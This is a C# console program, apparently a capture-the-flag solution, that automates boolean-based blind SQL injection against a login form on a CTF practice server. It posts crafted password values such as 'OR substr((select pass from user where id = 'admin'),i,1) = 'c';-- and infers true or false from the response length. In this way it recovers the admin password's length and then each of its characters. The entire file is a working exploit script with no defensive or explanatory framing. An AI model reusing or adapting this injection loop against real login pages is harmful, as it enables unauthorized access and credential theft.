using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace BlindSQLInjection20150524
{
    class Program
    {
        
        static char[] chrCollection;

        static void Main(string[] args)
        {
            string str = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
            chrCollection = str.ToCharArray();
            startAnalysing();    
        }

        static void startAnalysing()
        {
            int length_pass;
            
            length_pass = Enumerable.Range(1,32).Where(v => getLoginResult(
                    String.Format("'OR (select length(pass) from user where id = 'admin') = {0};--",v.ToString())
                )).First();
            Console.WriteLine("pass length = {0}",length_pass);

            var chr_pass = new char[length_pass];
            
            for(int i = 1;i < length_pass + 1;i++){
            var s = chrCollection.Where(v => getLoginResult(
                    String.Format("'OR substr((select pass from user where id = 'admin'),{0},1) = '{1}';--",i,v)
                )).First();

                chr_pass[i-1] = s;
                Console.WriteLine("{0}:{1}",i,s);
            }
            Console.WriteLine("pass = '{0}'", new string(chr_pass));
        }

        static HttpClient client;
        static FormUrlEncodedContent content;

        private static bool getLoginResult(string val)
        {
            var pairs = new List<KeyValuePair<string, string>>
            {
                new KeyValuePair<string, string>("id", "admin"),
                new KeyValuePair<string, string>("pass", val)
            };

            content = new FormUrlEncodedContent(pairs);
            client = new HttpClient();

            // call sync
            var response = client.PostAsync("http://ctfq.sweetduet.info:10080/~q6/", content).Result;
            //ContentLength が 2167　ならログイン成功
            if (response.Content.Headers.ContentLength == 2167)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
